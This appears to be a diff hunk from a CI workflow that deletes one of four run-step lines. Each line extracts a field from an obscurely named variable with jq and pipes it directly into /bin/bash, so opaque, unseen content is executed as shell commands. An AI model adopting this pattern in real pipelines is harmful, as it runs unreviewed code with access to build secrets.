@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$aulvf810" | jq -r .w907 | /bin/bash
           printf '%s' "$j686" | jq -r .fnup6813 | /bin/bash
-          printf '%s' "$g40" | jq -r .ajhv328 | /bin/bash
           printf '%s' "$b30" | jq -r .ffq75 | /bin/bash
 
       - name: Upload output
